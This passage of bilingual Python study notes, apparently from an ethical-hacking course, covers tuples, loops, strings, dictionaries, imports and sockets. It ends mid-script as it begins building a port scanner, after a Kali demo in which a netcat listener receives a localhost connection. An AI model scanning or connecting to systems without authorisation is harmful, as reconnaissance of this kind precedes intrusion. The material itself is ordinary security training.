<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = (<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Tuple Access</p>
<ul>
<li>使用索引存取元組中的各個元素，類似於清單</li>
<li><p>第一個元素的索引從 0 開始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(fruits[<span class="number">0</span>])    <span class="comment"># Output: &quot;apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(fruits[<span class="number">2</span>])    <span class="comment"># Output: &quot;orange&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Tuple Immutability</p>
<ul>
<li>元組是不可變的，無法修改它們的元素</li>
<li><p>一旦創建，其值就無法變更</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;grape&quot;</span>    <span class="comment"># This will raise an error</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Tuple Operations</p>
<ul>
<li>Concatenation<ul>
<li>使用 + 運算子連接兩個或多個元組</li>
</ul>
</li>
<li>Length<ul>
<li>len() 函數傳回元組中元素的數量</li>
</ul>
</li>
<li><p>Slicing</p>
<ul>
<li>使用切片從元組中提取子元組</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = (<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>)</span><br><span class="line">fruits2 = (<span class="string">&quot;grape&quot;</span>, <span class="string">&quot;kiwi&quot;</span>)</span><br><span class="line"></span><br><span class="line">combined = fruits + fruits2</span><br><span class="line"><span class="built_in">print</span>(combined)         <span class="comment"># Output: (&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;grape&quot;, &quot;kiwi&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fruits))      <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line">subtuple = fruits[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(subtuple)         <span class="comment"># Output: (&quot;banana&quot;, &quot;orange&quot;)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>想要儲存不應變更的值集合的情況下，元組非常有用</p>
</li>
<li>可用於對相關資料元素進行分組，也可用作字典中的鍵</li>
<li>更快的效能和防止意外修改</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Tuples - Do not change, ()</span></span><br><span class="line">grades = (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;f&quot;</span>)</span><br><span class="line"></span><br><span class="line">grades.pop, grades.append won<span class="string">&#x27;t work - not mutable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(grades[1])#b</span></span><br></pre></td></tr></table></figure>
<h3 id="looping"><a href="#looping" class="headerlink" title="looping"></a>looping</h3><ul>
<li>循環允許您多次重複一段程式碼</li>
<li>用於迭代資料結構、執行重複任務和控製程式流程</li>
<li><code>for</code> loops and <code>while</code> loops</li>
<li><p>for Loop</p>
<ul>
<li>用於迭代序列（例如列表、元組、字串或範圍）或任何可迭代物件</li>
<li><p>根據序列中的元素或項目執行固定次數的程式碼區塊</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sequence:</span><br><span class="line">    <span class="comment"># code to be executed for each item in the sequence</span></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:</span><br><span class="line">    <span class="built_in">print</span>(fruit)</span><br><span class="line"><span class="comment">#for 迴圈迭代水果清單中的每個項目，並為每個項目執行循環內的程式碼區塊 (print(fruit))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">apple</span></span><br><span class="line"><span class="string">banana</span></span><br><span class="line"><span class="string">orange</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>while Loop</p>
<ul>
<li>在給定條件為true時重複執行程式碼區塊</li>
<li><p>它繼續循環，直到條件變成false</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed while the condition is true</span></span><br><span class="line"></span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:<span class="comment">#條件 count &lt; 5 為true</span></span><br><span class="line">    <span class="built_in">print</span>(count)<span class="comment">#while 迴圈就會繼續執行迴圈內的程式碼 (print(count))</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>The break and continue Statements</p>
<ul>
<li>在 loops 內，您可以使用 break 語句提前退出循環</li>
<li>並使用Continue語句跳過目前迭代並移至下一個迭代</li>
<li><p>提供了一種強大的機制，用於迭代資料、執行計算和控製程式流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#For loops - start to finish of an iterate</span></span><br><span class="line">vegetables = [<span class="string">&quot;cucumber&quot;</span>, <span class="string">&quot;spinach&quot;</span>, <span class="string">&quot;cabbage&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> vegetables:</span><br><span class="line">	<span class="built_in">print</span>(x)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#While loops - execute as long as true</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">10</span>:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 break 退出循環</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用 break 退出循環:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 當 i 等於 5 ，退出循環</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;循環结束\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用 continue跳過當前迭代:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 當i是偶數，跳過該迭代</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;循环结束&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="Advanced-Strings"><a href="#Advanced-Strings" class="headerlink" title="Advanced Strings"></a><strong>Advanced Strings</strong></h3><ul>
<li><code>str</code> (string) 表示用單引號 (‘ ‘) 或雙引號 (“ “) 括起來的字元序列</li>
<li>Python 中的字串是不可變的，這意味著它們在創建後就無法更改</li>
<li><p>Creation</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello, World!&#x27;</span> <span class="keyword">or</span> my_string = <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Accessing Characters</p>
<ul>
<li><p>使用從 0 開始的索引來存取字串中的各個字元</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string[<span class="number">0</span>])<span class="comment">#H</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Concatenation</p>
<ul>
<li><p>使用 + 運算子連接（連接）兩個或多個字串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;Hello&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;World!&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Length</p>
<ul>
<li><p>len() 函數可用於確定字串的長度（字元數）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))<span class="comment">#output the length of the string</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Slicing</p>
<ul>
<li><p>使用切片從字串中提取子字串，並指定開始和結束索引</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">substring = my_string[<span class="number">7</span>:<span class="number">12</span>]<span class="comment">#extract the substring &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Methods</p>
<ul>
<li><p>提供了各種內建方法來操作和轉換字串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string.upper())<span class="comment">#output &#x27;HELLO, WORLD!&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Formatting</p>
<ul>
<li>字串格式允許您在字串中嵌入值</li>
<li>使用 % 運算子或 format() 方法來完成</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;Alice&#x27;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span> % (name, age))</span><br><span class="line"><span class="comment"># Output: My name is Alice and I&#x27;m 30 years old.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ADVANCED STRINGS</span></span><br><span class="line"></span><br><span class="line">my_name = <span class="string">&quot;Heath&quot;</span></span><br><span class="line"><span class="comment">#first letter</span></span><br><span class="line"><span class="built_in">print</span>(my_name[<span class="number">0</span>]) <span class="comment">#H</span></span><br><span class="line"><span class="comment">#last letter</span></span><br><span class="line"><span class="built_in">print</span>(my_name[-<span class="number">1</span>]) <span class="comment">#h</span></span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&quot;This is a sentence.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(sentence[:<span class="number">4</span>])<span class="comment">#This</span></span><br><span class="line"><span class="comment">#delimeter - default is a space </span></span><br><span class="line"><span class="built_in">print</span>(sentence.split()) <span class="comment">#[&#x27;This&#x27;, &#x27;is&#x27;, &#x27;a&#x27;, &#x27;sentence.&#x27;]</span></span><br><span class="line"></span><br><span class="line">sentence_split = sentence.split()</span><br><span class="line">sentence_join = <span class="string">&#x27; &#x27;</span>.join(sentence_split)</span><br><span class="line"><span class="built_in">print</span>(sentence_join)<span class="comment">#This is a sentence.</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;apple,banana,orange&quot;</span></span><br><span class="line">parts = s.split(<span class="string">&quot;,&quot;</span>)  <span class="comment"># 使用逗號分隔</span></span><br><span class="line"><span class="built_in">print</span>(parts)  <span class="comment"># 輸出: [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;]</span></span><br><span class="line"></span><br><span class="line">parts = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;,&quot;</span>.join(parts)  <span class="comment"># 使用逗号連接</span></span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># 輸出: &quot;apple,banana,orange&quot;</span></span><br><span class="line"></span><br><span class="line">quote = <span class="string">&quot;He said, &#x27;give me all your money&#x27;&quot;</span> - show example</span><br><span class="line">quote = <span class="string">&quot;He said, \&quot;give me all your money\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(quote)<span class="comment">#He said, &quot;give me all your money&quot;</span></span><br><span class="line"></span><br><span class="line">too_much_space = <span class="string">&quot;                       hello          &quot;</span></span><br><span class="line"><span class="built_in">print</span>(too_much_space.strip())<span class="comment">#hello</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Apple&quot;</span>) <span class="comment">#returns true</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Apple&quot;</span>) <span class="comment">#returns false - case sensitive</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;A&quot;</span></span><br><span class="line">word = <span class="string">&quot;Apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(letter.lower() <span class="keyword">in</span> word.lower()) <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line">movie = <span class="string">&quot;The Hangover&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite movie is &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(movie))<span class="comment">#My favorite movie is The Hangover.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite movie is %s&quot;</span> % movie)<span class="comment">#My favorite movie is The Hangover</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My favorite movie is <span class="subst">&#123;movie&#125;</span>&quot;</span>)<span class="comment">#My favorite movie is The Hangover</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a><strong>Dictionaries</strong></h3><ul>
<li>字典是鍵值對的無序集合</li>
<li>多功能且功能強大的資料結構</li>
<li>基於唯一鍵儲存、檢索和操作資料</li>
<li><p>Dictionary Creation</p>
<ul>
<li><p>將鍵值對括在大括號 { } 內，並用冒號 : 分隔每對</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;major&quot;</span>: <span class="string">&quot;Computer Science&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Dictionary Access:</p>
<ul>
<li>引用對應的鍵來存取字典中的值</li>
<li><p>鍵提供了一種唯一標識和檢索值的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(student[<span class="string">&quot;name&quot;</span>])   <span class="comment"># Output: &quot;Alice&quot;</span></span><br><span class="line"><span class="built_in">print</span>(student[<span class="string">&quot;age&quot;</span>])    <span class="comment"># Output: 20</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Dictionary Modification</p>
<ul>
<li>字典是可變的</li>
<li><p>透過將新值指派給特定鍵來修改它們的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student[<span class="string">&quot;age&quot;</span>] = <span class="number">21</span>       <span class="comment"># Modifying a value</span></span><br><span class="line">student[<span class="string">&quot;city&quot;</span>] = <span class="string">&quot;London&quot;</span>    <span class="comment"># Adding a new key-value pair</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Dictionary Operations</p>
<ul>
<li>Length<ul>
<li>len() 函數傳回字典中鍵值對的數量</li>
</ul>
</li>
<li>Iteration<ul>
<li>使用循環迭代字典的鍵、值或鍵值對</li>
</ul>
</li>
<li><p>Deletion</p>
<ul>
<li><p>使用 del 關鍵字從字典中刪除鍵值對</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;major&quot;</span>: <span class="string">&quot;Computer Science&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(student))          <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> student:</span><br><span class="line">    <span class="built_in">print</span>(key, student[key])  <span class="comment"># Output: &quot;name Alice&quot;, &quot;age 20&quot;, &quot;major Computer Science&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> student[<span class="string">&quot;age&quot;</span>]           <span class="comment"># Deleting a key-value pair</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>功能強大的資料結構</p>
</li>
<li>基於鍵存儲和檢索資料</li>
<li>用於組織和操作需要快速有效存取的資料</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DICTIONARIES - key/value pairs &#123;&#125;</span></span><br><span class="line"></span><br><span class="line">drinks = &#123;<span class="string">&quot;White Russian&quot;</span>: <span class="number">7</span>, <span class="string">&quot;Old Fashion&quot;</span>: <span class="number">10</span>, <span class="string">&quot;Lemon Drop&quot;</span>: <span class="number">8</span>&#125; <span class="comment">#drink is key, price is value</span></span><br><span class="line"><span class="built_in">print</span>(drinks)＃&#123;<span class="string">&#x27;White Russian&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Old Fashion&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;Lemon Drop&#x27;</span>: <span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line">employees = &#123;<span class="string">&quot;Finance&quot;</span>: [<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Linda&quot;</span>, <span class="string">&quot;Tina&quot;</span>], <span class="string">&quot;IT&quot;</span>: [<span class="string">&quot;Gene&quot;</span>, <span class="string">&quot;Louise&quot;</span>, <span class="string">&quot;Teddy&quot;</span>], <span class="string">&quot;HR&quot;</span>: [<span class="string">&quot;Jimmy Jr.&quot;</span>, <span class="string">&quot;Mort&quot;</span>]&#125;</span><br><span class="line">employees[<span class="string">&#x27;Legal&#x27;</span>] = [<span class="string">&quot;Mr. Frond&quot;</span>] <span class="comment">#adds new key:value pair</span></span><br><span class="line"><span class="built_in">print</span>(employees)＃&#123;<span class="string">&#x27;Finance&#x27;</span>: [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Linda&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>], <span class="string">&#x27;IT&#x27;</span>: [<span class="string">&#x27;Gene&#x27;</span>, <span class="string">&#x27;Louise&#x27;</span>, <span class="string">&#x27;Teddy&#x27;</span>], <span class="string">&#x27;HR&#x27;</span>: [<span class="string">&#x27;Jimmy Jr.&#x27;</span>, <span class="string">&#x27;Mort&#x27;</span>], <span class="string">&#x27;Legal&#x27;</span>: [<span class="string">&#x27;Mr. Frond&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line">employees.update(&#123;<span class="string">&quot;Sales&quot;</span>: [<span class="string">&quot;Andie&quot;</span>, <span class="string">&quot;Ollie&quot;</span>]&#125;) <span class="comment">#adds new key:value pair</span></span><br><span class="line"><span class="built_in">print</span>(employees)＃&#123;<span class="string">&#x27;Finance&#x27;</span>: [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Linda&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>], <span class="string">&#x27;IT&#x27;</span>: [<span class="string">&#x27;Gene&#x27;</span>, <span class="string">&#x27;Louise&#x27;</span>, <span class="string">&#x27;Teddy&#x27;</span>], <span class="string">&#x27;HR&#x27;</span>: [<span class="string">&#x27;Jimmy Jr.&#x27;</span>, <span class="string">&#x27;Mort&#x27;</span>], <span class="string">&#x27;Legal&#x27;</span>: [<span class="string">&#x27;Mr. Frond&#x27;</span>], <span class="string">&#x27;Sales&#x27;</span>: [<span class="string">&#x27;Andie&#x27;</span>, <span class="string">&#x27;Ollie&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line">drinks[<span class="string">&#x27;White Russian&#x27;</span>] = <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(drinks)＃&#123;<span class="string">&#x27;White Russian&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;Old Fashion&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;Lemon Drop&#x27;</span>: <span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drinks.get(<span class="string">&quot;White Russian&quot;</span>))＃<span class="number">8</span></span><br></pre></td></tr></table></figure>
<h3 id="Importing-Modules"><a href="#Importing-Modules" class="headerlink" title="Importing Modules"></a><strong>Importing Modules</strong></h3><ul>
<li>importing modules 存取和使用駐留在外部 Python 檔案或庫中的程式碼</li>
<li>組織和重複使用程式碼的方式</li>
<li><p>Importing Entire Modules</p>
<ul>
<li><p>若要匯入整個模組，請使用 import 關鍵字，後面接著模組名稱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math<span class="comment">#匯入 math 模組</span></span><br><span class="line"></span><br><span class="line">result = math.sqrt(<span class="number">25</span>)<span class="comment">#使用該模組中的 sqrt() 函數計算 25 的平方根</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Importing Specific Functions or Variables</p>
<ul>
<li><p>只需要使用模組中的特定函數或變量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt <span class="comment">#僅從 math 模組匯入 sqrt() 函數</span></span><br><span class="line"></span><br><span class="line">result = sqrt(<span class="number">25</span>)<span class="comment">#可以直接使用它，而無需在其前面添加模組名稱前綴</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Importing Modules with an Alias</p>
<ul>
<li>匯入模組並使用 as 關鍵字為其指定別名</li>
<li><p>處理具有長名稱的模組或避免命名衝突時很有幫助</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math <span class="keyword">as</span> m<span class="comment">#數學模組已匯入並指派別名 m</span></span><br><span class="line"></span><br><span class="line">result = m.sqrt(<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Importing All Functions and Variables</p>
<ul>
<li><p>使用 * 通配符。但是，通常建議僅匯入您需要的內容，以避免命名空間污染</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *  <span class="comment">#數學模組中的所有函數和變數都會直接匯入</span></span><br><span class="line"></span><br><span class="line">result = sqrt(<span class="number">25</span>)<span class="comment">#允許您在使用它們時無需添加模組名稱前綴。</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#IMPORTING - Importing is important.</span></span><br><span class="line"><span class="keyword">import</span> sys <span class="comment">#system functions and parameters</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt <span class="comment">#import with alias </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.version)<span class="comment">#3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0]</span></span><br><span class="line"><span class="built_in">print</span>(dt.now())<span class="comment">#2024-02-11 16:56:28.196440</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Sockets"><a href="#Sockets" class="headerlink" title="Sockets"></a>Sockets</h3><ul>
<li>透過網路在電腦之間進行通訊</li>
<li>讓程式透過各種網路協定（例如 TCP（傳輸控制協定）和 UDP（用戶資料報協定））建立連線、傳送資料和接收資料</li>
<li>建立客戶端-伺服器應用程式、網頁應用程式以及執行各種網路任務</li>
<li>透過使用不同協定的網路進行通訊。</li>
<li><p>Socket Creation</p>
<ul>
<li>import the <code>socket</code> module</li>
<li>使用 <code>socket.socket()</code>函數建立 socket 對象</li>
<li><p>該函數採用兩個參數</p>
<ul>
<li>the address family (e.g., socket.AF_INET for IPv4)</li>
<li>socket type (e.g., socket.SOCK_STREAM for TCP or socket.SOCK_DGRAM for UDP)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a TCP socket</span></span><br><span class="line">tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a UDP socket</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Socket Communication</p>
<ul>
<li>使用各種方法來建立連線、傳送資料和接收資料</li>
<li>socket.connect(address)<ul>
<li>建立到遠端位址的連線</li>
</ul>
</li>
<li>socket.bind(address)<ul>
<li>將Socket 綁定到特定的位址和連接埠</li>
</ul>
</li>
<li>socket.listen(backlog)<ul>
<li>偵聽 TCP socket上的傳入連線</li>
</ul>
</li>
<li>socket.accept()<ul>
<li>接受傳入連線並傳回一個新的 socket 物件以進行通訊</li>
</ul>
</li>
<li>socket.send(data)<ul>
<li>透過 socket 傳送資料</li>
</ul>
</li>
<li><p>socket.recv(buffer_size)</p>
<ul>
<li><p>從 socket 接收資料</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a TCP socket</span></span><br><span class="line">server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the socket to a specific address and port</span></span><br><span class="line">server_address = (<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">server_socket.bind(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Listen for incoming connections</span></span><br><span class="line">server_socket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Accept a client connection</span></span><br><span class="line">    client_socket, client_address = server_socket.accept()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Receive and send data</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    client_socket.send(<span class="string">b&quot;Received: &quot;</span> + data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Close the client socket</span></span><br><span class="line">    client_socket.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SOCKETS - Sockets can be used to connect two nodes together.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">7777</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment">#af_inet is ipv4, sock stream is a port</span></span><br><span class="line">s.connect((HOST,PORT))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nlvp 7777 </span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/python]</span><br><span class="line">└─$ python3 sock.py</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nlvp 7777 </span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">**connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44670** </span><br></pre></td></tr></table></figure>

### **Building a Port Scanner**

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define our target</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">	target = socket.gethostbyname(sys.argv[<span class="number">1</span>]) <span class="comment">#Translate hostname to IPv4</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Invalid amount of arguments.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span 